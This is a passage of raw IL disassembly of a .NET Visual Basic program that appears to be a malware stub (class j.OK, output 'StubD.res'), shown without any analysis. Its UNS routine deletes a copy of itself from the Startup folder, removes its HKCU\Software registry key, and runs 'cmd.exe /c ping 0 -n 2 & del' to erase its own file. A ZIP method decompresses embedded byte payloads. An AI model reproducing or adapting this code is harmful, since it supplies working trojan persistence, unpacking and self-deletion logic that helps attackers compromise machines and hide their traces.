      IL_0103:  ldc.i4.7
      IL_0104:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0109:  ldstr      "\\"
      IL_010e:  ldsfld     string j.OK::RG
      IL_0113:  ldstr      ".exe"
      IL_0118:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_011d:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0122:  nop
      IL_0123:  nop
      IL_0124:  leave.s    IL_0148

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0126:  dup
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012c:  stloc.s    V_7
      IL_012e:  nop
      IL_012f:  ldloc.s    V_7
      IL_0131:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0136:  nop
      IL_0137:  ldloc.s    V_7
      IL_0139:  stloc.s    V_6
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  nop
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0146:  leave.s    IL_0148

    }  // end handler
    IL_0148:  nop
    IL_0149:  nop
    .try
    {
      IL_014a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_014f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0154:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0159:  ldstr      "Software"
      IL_015e:  ldc.i4.1
      IL_015f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0164:  ldsfld     string j.OK::RG
      IL_0169:  ldc.i4.0
      IL_016a:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_016f:  nop
      IL_0170:  leave.s    IL_0194

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0172:  dup
      IL_0173:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0178:  stloc.s    V_8
      IL_017a:  nop
      IL_017b:  ldloc.s    V_8
      IL_017d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0182:  nop
      IL_0183:  ldloc.s    V_8
      IL_0185:  stloc.s    V_9
      IL_0187:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018c:  nop
      IL_018d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0192:  leave.s    IL_0194

    }  // end handler
    IL_0194:  nop
    IL_0195:  nop
    .try
    {
      IL_0196:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_019b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01a0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01a5:  ldstr      "\""
      IL_01aa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01af:  ldc.i4.0
      IL_01b0:  ldc.i4.0
      IL_01b1:  ldc.i4.m1
      IL_01b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01b7:  pop
      IL_01b8:  leave.s    IL_01dc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ba:  dup
      IL_01bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c0:  stloc.s    V_10
      IL_01c2:  nop
      IL_01c3:  ldloc.s    V_10
      IL_01c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ca:  nop
      IL_01cb:  ldloc.s    V_10
      IL_01cd:  stloc.s    V_11
      IL_01cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d4:  nop
      IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01da:  leave.s    IL_01dc

    }  // end handler
    IL_01dc:  nop
    IL_01dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01e2:  nop
    IL_01e3:  nop
    IL_01e4:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       120 (0x78)
    .maxstack  4
    .locals init (uint8[] V_0,
             uint8[] V_1,
             int32 V_2,
             class [System]System.IO.Compression.GZipStream V_3,
             class [mscorlib]System.IO.MemoryStream V_4,
             uint8[] V_5)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0007:  stloc.s    V_4
    IL_0009:  ldloc.s    V_4
    IL_000b:  ldc.i4.0
    IL_000c:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_0011:  stloc.3
    IL_0012:  ldc.i4.4
    IL_0013:  newarr     [mscorlib]System.Byte
    IL_0018:  stloc.1
    IL_0019:  ldloc.s    V_4
    IL_001b:  ldloc.s    V_4
    IL_001d:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0022:  ldc.i4.5
    IL_0023:  conv.i8
    IL_0024:  sub.ovf
    IL_0025:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_002a:  nop
    IL_002b:  ldloc.s    V_4
    IL_002d:  ldloc.1
    IL_002e:  ldc.i4.0
    IL_002f:  ldc.i4.4
    IL_0030:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0035:  pop
    IL_0036:  ldloc.1
    IL_0037:  ldc.i4.0
    IL_0038:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_003d:  stloc.2
    IL_003e:  ldloc.s    V_4
    IL_0040:  ldc.i4.0
    IL_0041:  conv.i8
    IL_0042:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0047:  nop
    IL_0048:  ldloc.2
    IL_0049:  ldc.i4.1
    IL_004a:  sub.ovf
    IL_004b:  ldc.i4.1
    IL_004c:  add.ovf
    IL_004d:  ldc.i4.1
    IL_004e:  sub.ovf
    IL_004f:  ldc.i4.1
    IL_0050:  add.ovf
    IL_0051:  newarr     [mscorlib]System.Byte
    IL_0056:  stloc.0
    IL_0057:  ldloc.3
    IL_0058:  ldloc.0
    IL_0059:  ldc.i4.0
    IL_005a:  ldloc.2
    IL_005b:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0060:  pop
    IL_0061:  ldloc.3
    IL_0062:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0067:  nop
    IL_0068:  ldloc.s    V_4
    IL_006a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_006f:  nop
    IL_0070:  ldloc.0
    IL_0071:  stloc.s    V_5
    IL_0073:  br.s       IL_0075

    IL_0075:  ldloc.s    V_5
    IL_0077:  ret
  } // end of method OK::ZIP

} // end of class j.OK


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\HiDDen\Desktop\StubD.res
